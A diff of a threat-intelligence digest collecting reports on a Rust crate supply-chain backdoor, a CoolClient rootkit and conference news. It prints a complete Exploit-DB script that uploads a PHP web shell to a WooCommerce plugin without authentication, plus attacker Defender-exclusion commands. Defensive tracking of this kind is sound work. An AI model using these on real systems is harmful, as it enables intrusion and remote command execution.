+- content_type: incident_report
+- confidence_tier: tier_2_operator
+
+#### Primary article taxonomy
+- threat_categories: supply_chain, web_shell_backdoor
+- affected_products: Apple iOS/macOS
+- content_type: incident_report
+- confidence_tier: tier_2_operator
+
+#### Summary
+
+```
+Malicious versions of the arrayref Rust crate (and others) executed a backdoor at compile time. The campaign's infrastructure overlaps with recent DPRK supply chain attacks, including Mastra and axios.
+```
+
+#### Full body
+
+```
+Wiz Pricing Get a demo Get a demo On August 20, 2026, malicious versions of three Rust crates were published to crates.io: arrayref@0.3.10 , internment@0.8.7 , and append-only-vec@0.1.9 . The malicious crates added a typosquatted dependency ( proc-macro1 ) whose build script downloads and executes a remote binary. Notably, proc-macro1 was the first dependency added to arrayref in its ten-year history. Because build scripts run during compilation, building an affected project was sufficient to execute the payload. arrayref can be found in over 35% of all environments. Even more notably, it's used in ¾ of all environments where Rust is present. Prevalence of impacted Rust Packages (any version) The Rust Security Response Team deleted the malicious versions and locked the account, and assesses that the maintainer's machine or credentials were compromised . Wiz customers should review our Threat Intel Center advisory: arrayref and Other Rust Crates Hijacked in Supply Chain Attack Technical Details The impacted package versions add a malicious dependency to the Cargo.toml : [dependencies] proc-macro1 = "1.0.107" proc-macro1 is a typosquat of the legitimate proc-macro2 crate (154M+ downloads). Its build.rs contains the malicious logic. Because Cargo executes build scripts at compile time, building a project that depends on proc-macro1 is sufficient to trigger the payload. Malicious build.rs At compile time, the build script: Reconstructs a C2 URL from Base64 fragments (e.g. https://23.254.165[.]112:9089/ ) Disables TLS certificate validation via a custom AcceptAll verifier Downloads a platform-specific payload based on OS and architecture Writes it to /tmp/rust-setup (Unix) or %TEMP%\rust-setup.ps1 (Windows) Executes the payload, passing the C2 beacon address as an argument The build otherwise completes and the package functions normally. The second stage payload is selected based on the platform, with support for x86_64 versions of Linux, Windows, and macOS, in addition to aarch64 macOS. Second Stage Capabilities Wiz Research was able to analyze the malicious Rust crates, retrieved from Google Threat Intelligence . The implant is a featureful backdoor that: Beacons to C2 via HTTPS POST (to the endpoint /49890878 ), exfiltrating host info and stolen credentials as Base64-encoded JSON Collects hostname, username and operating system details, enumerates installed applications, and reads Chrome, Brave and Edge profiles for saved logins and extension settings, querying the browsers' SQLite credential stores directly. Edit: A prior version of this piece mistakenly stated that browser credentials were stolen. The queries only enumerate saved logins, they do not retrieve the encrypted credential material. Persists via Registry Run key (Windows), LaunchAgent (macOS), or systemd user service (Linux) Supports four commands: kill (terminate), minicfg (reconfigure C2 and beacon interval), startup (install persistence), and runscript (download and execute PowerShell or shell scripts, synchronously or in background) Falls back to a Domain Generation Algorithm if the primary C2 is unreachable, generating 10 algorithmic .com domains every 5 days. Currently, the relevant domains do not appear to be registered. Configuration is encrypted with AES-128-GCM using the hardcoded key i am botking . Commands are authenticated via an embedded RSA-2048 private key. Overlap with DPRK Supply Chain Attacks The arrayref infrastructure substantially overlaps with operations attributed to recent North Korean actors. Shared C2 endpoint pattern: The arrayref payloads beacon to /49890878 . This endpoint has been used in the Mastra campaign, attributed by Microsoft to DPRK / Sapphire Sleet . The IP address used in the arrayref beacon also shares an SSL issuer ( WIN-A6QF8AHPQH1\Administrator@WIN-A6QF8AHPQH1 ) with 23.254.167[.]13 - also used in the Mastra campaign. Victim-reported infrastructure overlap: A victim has reported C2 traffic to 23.254.167[.]216 . This IP app
+```
+
+#### Corroborating sources (1)
+
+- **Wiz Research** (cloud_identity_infrastructure)
+  - Title: Rust Supply Chain Attack on arrayref: Significant Overlap with DPRK Campaigns
+  - Published: 2026-08-20T15:56:39+00:00
+  - Link: https://www.wiz.io/blog/rust-supply-chain-attack-on-arrayref-significant-overlap-with-dprk-campaigns
+  - Summary: Malicious versions of the arrayref Rust crate (and others) executed a backdoor at compile time. The campaign's infrastructure overlaps with recent DPRK supply chain attacks, including Mastra and axios.
 
 ### Cluster 08eea4e588 — score 16
 
@@ -1505,17 +1494,21 @@ lurker • August 20, 2026 3:38 PM May 26 – July 4 is 40 days that Agents have
 - Source: Exploit-DB (offensive_vulnerability_research)
 - Published: 2026-08-17T00:00:00+00:00
 - Link: https://www.exploit-db.com/exploits/52642
-- Fetch status: fetch_failed:HTTPError
+- Fetch status: ok
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: (none)
 
 #### Cluster taxonomy (union across members)
+- affected_products: WordPress
+- cve_ids: CVE-2026-3891
 - urgency_signals: preauth_unauth
 - content_type: news_report
 - confidence_tier: tier_1_offensive_research
 
 #### Primary article taxonomy
+- affected_products: WordPress
+- cve_ids: CVE-2026-3891
 - urgency_signals: preauth_unauth
 - content_type: news_report
 - confidence_tier: tier_1_offensive_research
@@ -1524,6 +1517,12 @@ lurker • August 20, 2026 3:38 PM May 26 – July 4 is 40 days that Agents have
 
 ```
 WooCommerce 1.5.0 - Unauthenticated Arbitrary File Upload
+```
+
+#### Full body
+
+```
+Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training WooCommerce 1.5.0 - Unauthenticated Arbitrary File Upload EDB-ID: 52642 CVE: 2026-3891 EDB Verified: Author: Mohammad Hossein Sadeghian Type: webapps Exploit: / Platform: Multiple Date: 2026-08-17 Vulnerable App: # Exploit Title: WooCommerce 1.5.0 - Unauthenticated Arbitrary File Upload # Google Dork: N/A # Date: 2026-07-15 # Exploit Author: Mohammad Hossein Sadeghian # Vendor Homepage: https://wordpress.org/plugins/payment-gateway-pix-for-woocommerce/ # Software Link: https://wordpress.org/plugins/payment-gateway-pix-for-woocommerce/ # Version: <= 1.5.0 # Tested on: Ubuntu 22.04 LTS, Apache 2.4, PHP 8.2, WordPress 6.7 # CVE: CVE-2026-3891 import requests import sys def print_banner(): banner = r""" ____ __ _ __ __ / __ \________ ____ _____/ / / | / /__ / /_ / / / / ___/ _ \/ __ \/ __ / / |/ / _ \/ __/ / /_/ / / / __/ /_/ / /_/ / / /| / __/ /_ /_____/_/ \___/\__,_/\__,_/ /_/ |_/\___/\__/ Author: m4sh_wacker """ print(banner) def main(): print_banner() target = input("[?] Enter target URL: ").strip().rstrip("/") if not target.startswith(("http://", "https://")): target = "http://" + target ajax_url = f"{target}/wp-admin/admin-ajax.php" filename = "woocommerce.php" content = '<?php if(isset($_REQUEST["cmd"])){system($_REQUEST["cmd"]);} ?>' session = requests.Session() print("\n[*] Requesting nonce...") try: response = session.post( ajax_url, data={ "action": "lkn_pix_for_woocommerce_generate_nonce", "action_name": "lkn_pix_for_woocommerce_c6_settings_nonce" }, timeout=10 ) result = response.json() nonce = result["data"]["nonce"] print(f"[+] Nonce obtained: {nonce}") except Exception as e: print(f"[-] Failed to obtain nonce: {e}") sys.exit(1) print(f"[*] Uploading {filename}...") try: response = session.post( ajax_url, data={ "action": "lkn_pix_for_woocommerce_c6_save_settings", "_ajax_nonce": nonce }, files={ "certificate_crt_path": ( filename, content, "text/plain" ) }, timeout=10 ) result = response.json() if not result.get("success"): print("[-] Upload failed.") print(response.text) sys.exit(1) except Exception as e: print(f"[-] Upload error: {e}") sys.exit(1) uploaded_url = ( f"{target}/wp-content/plugins/" f"payment-gateway-pix-for-woocommerce/" f"Includes/files/certs_c6/{filename}" ) print("\n[+] File uploaded successfully!") print(f"[+] URL: {uploaded_url}") if __name__ == "__main__": main() Tags: Advisory/Source: Link Databases Links Sites Solutions Exploits Search Exploit-DB OffSec Courses and Certifications Google Hacking Submit Entry Kali Linux Learn Subscriptions Papers SearchSploit Manual VulnHub OffSec Cyber Range Shellcodes Exploit Statistics Proving Grounds Penetration Testing Services Databases Exploits Google Hacking Papers Shellcodes Links Search Exploit-DB Submit Entry SearchSploit Manual Exploit Statistics Sites OffSec Kali Linux VulnHub Solutions Courses and Certifications Learn Subscriptions OffSec Cyber Range Proving Grounds Penetration Testing Services
 ```
 
 #### Corroborating sources (1)
@@ -1959,6 +1958,51 @@ UAT-10147: Chinese-speaking adversary integrates agentic AI into post-compromise
   - Link: https://blog.talosintelligence.com/uat-10147-chinese-speaking-adversary-integrates-agentic-ai-into-post-compromise-operations/
   - Summary: Cisco Talos discovered a Chinese-speaking cybercrime group, tracked as UAT-10147, that targets a wide range of vulnerable web servers. This is an overview of the campaign, examining the countries affected, potential impact of BadIIS infections, the attack chain, and post-compromise tactics.
 
+### Cluster 21cbe0b5fa — score 10
+
+- Title: APT group HoneyMyte upgrades CoolClient: the backdoor gets a kernel-level Windows rootkit
+- Source: Kaspersky Securelist (threat_research_primary)
+- Published: 2026-08-14T09:00:14+00:00
+- Link: https://securelist.com/honeymyte-coolclient-driver-rootkit/121028/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: apt_espionage, web_shell_backdoor
+- actor_attribution: Mustang Panda
+- affected_products: Microsoft Defender
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Primary article taxonomy
+- threat_categories: apt_espionage, web_shell_backdoor
+- actor_attribution: Mustang Panda
+- affected_products: Microsoft Defender
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Summary
+
+```
+Our experts discovered a new CoolClient backdoor variant with a kernel-mode rootkit driver that hides malicious processes, files, and network connections from security tools and threat analysts.
+```
+
+#### Full body
+
+```
+Table of Contents Introduction Technical analysis CoolClient components First stage: libngs.dll Second stage: loadcert.ini (before synchost.exe injection) Command handler Establishing AutoRun persistence Process injection into synchost.exe Service installation Administrator privilege check Elevated relaunch and UAC bypass Second stage: loadcert.ini (Injected Execution) Kernel-Mode driver deployment Driver initialization Cert.ini process injection Msagent.sys driver Driver configuration Preparation for process hiding Process, object, and image load callbacks Object callbacks Process and image load callbacks MiniFilter registration Registry callback registration IOCTL command dispatcher Kernel module enumeration and hiding Nsiproxy hooking and data filtering Victimology Attribution Conclusion IOCs Authors Fareed Radzi Introduction CoolClient is a backdoor family attributed to the HoneyMyte APT group (also known as Mustang Panda) that has been used in their cyber-espionage campaigns targeting organizations across Asia and Russia. It supports such capabilities as keylogging, clipboard theft, credential harvesting, file management, system reconnaissance, and plugin-based extensions. Since its first public disclosure by Sophos in 2022 and subsequent analysis by Trend Micro in 2023 , CoolClient has continued to evolve. In 2025 , we analyzed a newer variant that introduced clipboard theft and HTTP traffic interception for credential harvesting. In late 2025 and 2026, our latest investigation reveal another major evolution. The newest CoolClient variant can deploy a signed kernel-mode driver as a Windows service and communicate with it through IOCTL requests. The driver enhances the malware’s stealth by hiding the CoolClient process, protecting related files and registry entries, and preventing them from being inspected or modified. The overall design is comparable to the kernel-mode enhancements previously observed in ToneShell , but the CoolClient driver exposes dedicated IOCTL handlers that allow the user-mode backdoor to communicate directly with the driver. We have observed this updated CoolClient variant and its accompanying driver in intrusions across multiple countries in Asia, including Pakistan, Mongolia, and Myanmar. Technical analysis In the observed campaign targeting Myanmar, HoneyMyte used PlugX as the initial post-compromise implant to deploy the CoolClient components. Before deploying the malware, the actor added both a folder exclusion and a file exclusion to Microsoft Defender for the fake Windows Defender installation directory and the renamed sideloader executable ( defender.exe ). wmic /Node:localhost /Namespace:\\Root\Microsoft\Windows\Defender Path MSFT_MpPreference call Add ExclusionPath="$programfiles\Microsoft\Windows Defender" wmic /Node:localhost /Namespace:\\Root\Microsoft\Windows\Defender Path MSFT_MpPreference call Add ExclusionPath="$programfiles\Microsoft\Windows Defender\defender.exe" 1 2 wmic / Node : localhost / Namespace : \ \ Root \ Microsoft \ Windows \ Defender Path MSFT_MpPreference call Add ExclusionPath = "$programfiles\Microsoft\Windows Defender" wmic / Node : localhost / Namespace : \ \ Root \ Microsoft \ Windows \ Defender Path MSFT_MpPreference call Add ExclusionPath = "$programfiles\Microsoft\Windows Defender\defender.exe" The actor then created a fake Windows Defender installation directory, copied the CoolClient components into it, and renamed a legitimate Sangfor executable, usually named Sang.exe , to defender.exe to serve as the DLL sideloader. xcopy "$programfiles\Windows Defender\*" "$programfiles\Microsoft\Windows Defender" /a /s /v /e /f 1 xcopy "$programfiles\Windows Defender\*" "$programfiles\Microsoft\Windows Defender" / a / s / v / e / f Persistence was established through a scheduled task that launched defender.exe with SYSTEM privileges during system startup. schtasks /create /sc onstart /tn "\Microsoft\Windows\Windows Defender Advanced Threat Protection Service" /tr "\"$p
+```
+
+#### Corroborating sources (1)
+
+- **Kaspersky Securelist** (threat_research_primary)
+  - Title: APT group HoneyMyte upgrades CoolClient: the backdoor gets a kernel-level Windows rootkit
+  - Published: 2026-08-14T09:00:14+00:00
+  - Link: https://securelist.com/honeymyte-coolclient-driver-rootkit/121028/
+  - Summary: Our experts discovered a new CoolClient backdoor variant with a kernel-mode rootkit driver that hides malicious processes, files, and network connections from security tools and threat analysts.
+
 ### Cluster 8a66834bf6 — score 10
 
 - Title: Thousands of Hacked WordPress Sites, One Operation: Unmasking StopAndProtect
@@ -2054,51 +2098,6 @@ FILTER BY YEAR 2026 2025 2024 2023 2022 2021 2020 2019 2018 2017 2016 17th Augus
   - Published: 2026-08-17T13:37:34+00:00
   - Link: https://research.checkpoint.com/2026/17th-august-threat-intelligence-report/
   - Summary: For the latest discoveries in cyber research for the week of 17th August, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Colombia’s Ministry of Justice has experienced a ransomware attack that affected part of its technology infrastructure and disrupted public services related to illicit-drug monitoring and legal processes. Officials confirmed that some files were […] The post 17th August – Threat Intelligence Report appeared first on Check Point Research .
-
-### Cluster 21cbe0b5fa — score 10
-
-- Title: APT group HoneyMyte upgrades CoolClient: the backdoor gets a kernel-level Windows rootkit
-- Source: Kaspersky Securelist (threat_research_primary)
-- Published: 2026-08-14T09:00:14+00:00
-- Link: https://securelist.com/honeymyte-coolclient-driver-rootkit/121028/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: apt_espionage, web_shell_backdoor
-- actor_attribution: Mustang Panda
-- affected_products: Microsoft Defender
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Primary article taxonomy
-- threat_categories: apt_espionage, web_shell_backdoor
-- actor_attribution: Mustang Panda
-- affected_products: Microsoft Defender
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Summary
-
-```
-Our experts discovered a new CoolClient backdoor variant with a kernel-mode rootkit driver that hides malicious processes, files, and network connections from security tools and threat analysts.
-```
-
-#### Full body
-
-```
-Table of Contents Introduction Technical analysis CoolClient components First stage: libngs.dll Second stage: loadcert.ini (before synchost.exe injection) Command handler Establishing AutoRun persistence Process injection into synchost.exe Service installation Administrator privilege check Elevated relaunch and UAC bypass Second stage: loadcert.ini (Injected Execution) Kernel-Mode driver deployment Driver initialization Cert.ini process injection Msagent.sys driver Driver configuration Preparation for process hiding Process, object, and image load callbacks Object callbacks Process and image load callbacks MiniFilter registration Registry callback registration IOCTL command dispatcher Kernel module enumeration and hiding Nsiproxy hooking and data filtering Victimology Attribution Conclusion IOCs Authors Fareed Radzi Introduction CoolClient is a backdoor family attributed to the HoneyMyte APT group (also known as Mustang Panda) that has been used in their cyber-espionage campaigns targeting organizations across Asia and Russia. It supports such capabilities as keylogging, clipboard theft, credential harvesting, file management, system reconnaissance, and plugin-based extensions. Since its first public disclosure by Sophos in 2022 and subsequent analysis by Trend Micro in 2023 , CoolClient has continued to evolve. In 2025 , we analyzed a newer variant that introduced clipboard theft and HTTP traffic interception for credential harvesting. In late 2025 and 2026, our latest investigation reveal another major evolution. The newest CoolClient variant can deploy a signed kernel-mode driver as a Windows service and communicate with it through IOCTL requests. The driver enhances the malware’s stealth by hiding the CoolClient process, protecting related files and registry entries, and preventing them from being inspected or modified. The overall design is comparable to the kernel-mode enhancements previously observed in ToneShell , but the CoolClient driver exposes dedicated IOCTL handlers that allow the user-mode backdoor to communicate directly with the driver. We have observed this updated CoolClient variant and its accompanying driver in intrusions across multiple countries in Asia, including Pakistan, Mongolia, and Myanmar. Technical analysis In the observed campaign targeting Myanmar, HoneyMyte used PlugX as the initial post-compromise implant to deploy the CoolClient components. Before deploying the malware, the actor added both a folder exclusion and a file exclusion to Microsoft Defender for the fake Windows Defender installation directory and the renamed sideloader executable ( defender.exe ). wmic /Node:localhost /Namespace:\\Root\Microsoft\Windows\Defender Path MSFT_MpPreference call Add ExclusionPath="$programfiles\Microsoft\Windows Defender" wmic /Node:localhost /Namespace:\\Root\Microsoft\Windows\Defender Path MSFT_MpPreference call Add ExclusionPath="$programfiles\Microsoft\Windows Defender\defender.exe" 1 2 wmic / Node : localhost / Namespace : \ \ Root \ Microsoft \ Windows \ Defender Path MSFT_MpPreference call Add ExclusionPath = "$programfiles\Microsoft\Windows Defender" wmic / Node : localhost / Namespace : \ \ Root \ Microsoft \ Windows \ Defender Path MSFT_MpPreference call Add ExclusionPath = "$programfiles\Microsoft\Windows Defender\defender.exe" The actor then created a fake Windows Defender installation directory, copied the CoolClient components into it, and renamed a legitimate Sangfor executable, usually named Sang.exe , to defender.exe to serve as the DLL sideloader. xcopy "$programfiles\Windows Defender\*" "$programfiles\Microsoft\Windows Defender" /a /s /v /e /f 1 xcopy "$programfiles\Windows Defender\*" "$programfiles\Microsoft\Windows Defender" / a / s / v / e / f Persistence was established through a scheduled task that launched defender.exe with SYSTEM privileges during system startup. schtasks /create /sc onstart /tn "\Microsoft\Windows\Windows Defender Advanced Threat Protection Service" /tr "\"$p
-```
-
-#### Corroborating sources (1)
-
-- **Kaspersky Securelist** (threat_research_primary)
-  - Title: APT group HoneyMyte upgrades CoolClient: the backdoor gets a kernel-level Windows rootkit
-  - Published: 2026-08-14T09:00:14+00:00
-  - Link: https://securelist.com/honeymyte-coolclient-driver-rootkit/121028/
-  - Summary: Our experts discovered a new CoolClient backdoor variant with a kernel-mode rootkit driver that hides malicious processes, files, and network connections from security tools and threat analysts.
 
 ### Cluster 8883aedcfe — score 10
 
@@ -2979,47 +2978,6 @@ A heap of overflow in August’s Patch Tuesday haul 421 CVEs, a relatively small
   - Published: 2026-08-17T00:00:00+00:00
   - Link: https://www.sophos.com/en-us/blog/2608-patch-tuesday
   - Summary: <p>421 CVEs, a relatively small set of Edge patches, and two spicy stragglers</p> Categories: Threat Research Tags: Patch Tuesday, MICROSOFT PATCH TUESDAY
-
-### Cluster ed4882ad78 — score 8
-
-- Title: 10 Hacker Summer Camp Standouts at Black Hat and DEF CON
-- Source: Huntress (detection_response_operations)
-- Published: 2026-08-14T04:00:00+00:00
-- Link: https://www.huntress.com/blog/black-hat-def-con-standouts
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- affected_industries: financial_services
-- content_type: news_report
-- confidence_tier: tier_2_operator
-
-#### Primary article taxonomy
-- affected_industries: financial_services
-- content_type: news_report
-- confidence_tier: tier_2_operator
-
-#### Summary
-
-```
-From the panels to the villages, Huntress researchers and SOC analysts were all over Hacker Summer Camp this year. Here’s what stood out at Black Hat and DEF CON.
-```
-
-#### Full body
-
-```
-Home Blog From Black Hat to DEF CON: 10 Hacker Summer Camp Standouts Published: August 14, 2026 From Black Hat to DEF CON: 10 Hacker Summer Camp Standouts By: Lindsey O'Donnell-Welch Bryson Byrd Natalie Suarez Summarize with AI Summarize ChatGPT Claude Perplexity Google AI Another year, another epic Hacker Summer Camp session. There were stickers galore. There was LineCon. Cliff Stoll took over a threat hunting panel . People decried John Hammond 's absence. All in all, a solid week. Behind it all, Huntress researchers were everywhere, and not just at our Black Hat booth: giving DEF CON talks, lending support to all the villages (Malware, Blue Team, Red Team, and more), and participating in the HacktheBox SOC Showdown. Here are 10 highlights from Hacker Summer Camp this year that we loved. 1. CloudBasher unleashed At DEF CON , Principal Security Researchers Jenko Hwong and Chris Ryan detailed their research into CloudShell, a browser-based terminal that major cloud providers offer so users can manage their cloud resources without installing anything locally. The research involved reverse-engineering the private REST and websocket protocols behind AWS, Azure, and GCP CloudShell terminals, along with analyzing browser authentication flows connecting cookies to OAuth tokens. The investigation unearthed significant Identity and Access Management (IAM) design weaknesses, including websocket sessions that outlive API token revocation and default CloudShell access tied to consumer email accounts. This all culminated in CloudBasher, a newly released toolkit that automates environment discovery, enumeration, and deployment of distributed workloads with persistent storage and private networking. Jenko and Chris demonstrated CloudBash live during the session across a resilient, large-scale agent network Jenko Hwong and Chris Ryan crack open CloudShell 2. All the villages DEF CON has almost 40 villages. These community initiatives are focused on tradecraft, offensive security, adversary simulation, emulation, and more across a number of different spaces–whether that's bug bounty, cryptocurrency, lockpicking, IoT, physical security, scambait, car hacking or biohacking. You could find us at the Malware Village, where Andrew Brandt , principal threat intelligence incident commander, and Austin Worline, security operations analyst, were helping out. Austin Worline fixes badges at Malware Village We were also leading the charge at the Red Team Village (where Logan MacLaren, staff offensive security engineer, was leading the command and conquer workshop ), and Blue Team Village (where Christina Parry, staff software engineer, led "The Modern Detection Engineer" panel). Christina Parry speaks during "The Modern Detection Engineer" panel 3. AI everywhere, and an industry deciding what it all means Unless you've been living under a rock, you knew AI would be all over Hacker Summer Camp. What stood out this year was less the volume and more the maturity of the conversation. On the Black Hat floor, every vendor claimed to be "agentic," but almost nobody defined it. Autonomous SOC analysts? LLMs with tool access? A chatbot with a scheduler? It felt like the EDR vs XDR debates all over again, the kind of terminology fight that always happens right before a market sorts itself out. Your browser settings or extensions (such as ad blockers or tracking protection) prevented this content from loading. Open on LinkedIn Over at DEF CON, the conversation went a layer deeper. AI safety and policy discussions pulled real crowds, from Policy Village panels with people at frontier AI labs to hallway debates about model guardrails and platform abuse. The question we kept hearing was changing from "can we hack it" to "who owns the problem when it goes wrong." That shift matters, because AI is getting wired into security tooling and attacker tooling at the same time. There is real innovation under the buzzwords, and DEF CON remains one of the only places where the b
-```
-
-#### Corroborating sources (1)
-
-- **Huntress** (detection_response_operations)
-  - Title: 10 Hacker Summer Camp Standouts at Black Hat and DEF CON
-  - Published: 2026-08-14T04:00:00+00:00
-  - Link: https://www.huntress.com/blog/black-hat-def-con-standouts
-  - Summary: From the panels to the villages, Huntress researchers and SOC analysts were all over Hacker Summer Camp this year. Here’s what stood out at Black Hat and DEF CON.
 
 ### Cluster 0adf15e51b — score 8
 
